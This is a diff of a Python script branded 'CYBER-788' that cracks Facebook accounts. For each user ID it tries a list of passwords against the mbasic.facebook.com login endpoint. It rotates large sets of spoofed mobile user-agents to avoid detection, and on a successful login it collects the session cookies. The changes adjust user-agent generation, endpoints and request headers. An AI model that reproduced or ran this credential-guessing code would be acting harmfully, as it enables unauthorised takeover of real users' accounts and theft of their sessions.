@@ -1,6 +1,6 @@
 # -----------------[ CYBER-788 ]-------------------#
 #GIFT FOR Legend 
-#TG CHNNAL :  https://githubcom/RozhakXD/Ezlikers
+#GithHub :  https://githubcom/RozhakXD/Ezlikers
 #OWNER : tan-vir
 #TEAM : CYBER-788
 # -----------------[ CYBER-788 ]-------------------#
@@ -96,8 +96,6 @@ ha = current.day
 today = date.today()
 os.system("xdg-open hhttps://githubcom/RozhakXD/Ezlikers")
 logo = ("""
-
-
 \033[1;93m _______   _______ ___________     ___________  _____ 
 \033[1;92m/  __ \ \ / / ___ \  ___| ___ \   |___  /  _  ||  _  |
 \033[1;93m| /  \/\ V /| |_/ / |__ | |_/ /_____ / / \ V /  \ V / 
@@ -116,7 +114,6 @@ logo = ("""
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TEAM         : \033[1;35mCyber-788                 
      \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION : \033[1;36m1.0                   
 \033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
-
 """)
 def shoha():
 	print(" \033[36;1m═════════════════════════════════════════════════")
@@ -158,107 +155,55 @@ def dynamic(text):
 #User agents
 ugen2=[]
 ugen=[]
- 
-for xd in range(10000):
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
-    c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
-for ua in range(5000):
-      a='Mozilla/5.0 (Linux; Android'
-      b=random.choice(['5.1.1' , '6.0.1' , '7.1.1' , '12' , '13' , '14' , '15'])
-      y=random.choice(['SM-J320H' , 'SM-J3109' , 'J320FN' , 'SM-J320P' , 'SM-J320F' , 'SM-J320G' , 'SM-J320Y'])
-      c='Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-      d=random.randrange(40,115)
-      e='0'
-      f=random.randrange(3000,6000)
-      g=random.randrange(20,100)
-      h='Mobile Safari/537.36'
-      ug=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
-      ugen.append(ug)
-for ua in range(5000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['8','9','10','11','12','13','14','15'])
-	c='itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	d=random.randrange(40,115)
-	e='0'
-	f=random.randrange(3000,6000)
-	g=random.randrange(20,100)
-	h='Mobile Safari/537.36'
-	alhaj=(f"{a} {b}; {c}{d}.{e}.{f}.{g} {h}")
-	ugen.append(alhaj)
-for ua in range(5000):
-    a='NokiaX'
-    b=random.randrange(1,9)
-    c='-0'
-    d=random.randrange(1,9)
-    e='/'
-    f=random.randrange(1,9)
-    g='.0 ('
-    h=random.randrange(1,12)
-    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
-    j='UNTRUSTED/'
-    k=random.randrange(1,3)
-    l='.0'
-    alhaj=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
-    ugen.append(alhaj)
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 13; moto g53y 5G Build/T1TPJS33.75-17-3-2; wv)'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='Android 13; moto g53y 5G Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
+   
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 9; moto g(6) Build/PPSS29.55-37-7-10; wv)'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='Android 9; moto g(6) Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.61'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/418.0.0.33.69;]'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
 
-for ua in range(5000):
-	a='Mozilla/5.0 (Linux; Android'
-	b=random.choice(['8','9','10','11','12','13','14','15'])
-	y=random.choice(['RMX3571','RMX3511','RMX3461','RMX3741','RMP2107','RMX3572','RMX1921','RMX3121','RMX3121','RMX3350','RMX3511'])
-	c='Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
-	d=random.randrange(40,115)
-	e='0'
-	f=random.randrange(3000,6000)
-	g=random.randrange(20,100)
-	h='Mobile Safari/537.36'
-	alhaj=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
-	ugen.append(alhaj)    
-
-def samiya(uid):
-    if len(uid)==15:
-        if uid[:10] in ['1000000000']       :king = ' (*-*) 2009'
-        elif uid[:9] in ['100000000']       :king = '√ 2009'
-        elif uid[:8] in ['10000000']        :king = '√ 2009'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:king = '√ 2004'
-        elif uid[:7] in ['1000006','1000007','1000008','1000009']:king = ' 2010'
-        elif uid[:6] in ['100001']          :king = '√ 2010/2011'
-        elif uid[:6] in ['100002','100003'] :king = '√ 2011/2012'
-        elif uid[:6] in ['100004']          :king = '√ 2012/2013'
-        elif uid[:6] in ['100005','100006'] :king = '√ 2013/2014'
-        elif uid[:6] in ['100007','100008'] :king = '√ 2014/2015'
-        elif uid[:6] in ['100009']          :king = '√ 2015'
-        elif uid[:5] in ['10001']           :king = '√ 2015/2016'
-        elif uid[:5] in ['10002']           :king = '√ 2016/2017'
-        elif uid[:5] in ['10003']           :king = '√ 2018/2019'
-        elif uid[:5] in ['10004']           :king = '√ 2019/2020'
-        elif uid[:5] in ['10005']           :king = '√ 2020'
-        elif uid[:5] in ['10006','10007','']:king = '√ 2021'
-        elif uid[:5] in ['10008']           :king = '√ 2022'
-        elif uid[:5] in ['10009']           :king = '√ 2023'
-        else:king=''
-    elif len(uid) in [9,10]:
-        king = ' √ 2008/2009'
-    elif len(uid)==8:
-        king = '√ 2007/2008'
-    elif len(uid)==7:
-        king = '√ 2006/2007'
-    else:king=''
-    return king
-    
-    
-    
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 12; moto g(60) Build/S2RIS32.32-20-7-15; wv)'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='Android 12; moto g(60) Build/'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)
+         
+   
 # APK CHECK
 def umo_in():
     user=[]
@@ -316,7 +261,7 @@ def rcrack(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            free_fb = session.get('https://p.facebook.com').text
+            free_fb = session.get('https://m.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -328,28 +273,24 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             header_freefb = {'authority': 'mbasic.facebook.com',
-            'method': 'GET',
-            'scheme': 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'dpr': '2',
-            'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=Afeu87ocu_9wCyybuUYaLqoME1zGNPv-S90KJX4rqv8Pbv3egYsDofgwftzEklhRi6fo-3jrfgR_rlk9A9fbHhnAVCP4845w0xDzM2FEWqjAwQ&smuh=13191&lh=Ac_Xiz_kQgN15eTEmo0&wtsid=rdr_0SR78TSbIhy2QwCOA&ref_component=mbasic_footer&_rdr',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.57"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"itel S661LP"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"11.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
-            'viewport-width': '980',}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+             "method": 'GET',
+             "scheme": 'https',
+             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+             'cache-control': 'max-age=0',
+             'sec-ch-prefers-color-scheme': 'dark',
+             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
+             'sec-ch-ua-mobile': '?1',
+             'sec-ch-ua-platform': '"Android"',
+             'sec-ch-ua-platform-version': '"10.0.0"',
+             'sec-fetch-dest': 'document',
+             'sec-fetch-mode': 'navigate',
+             'sec-fetch-site': 'none',
+             'sec-fetch-user': '?1',
+             'upgrade-insecure-requests': '1',
+             'user-agent': pro}
+            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
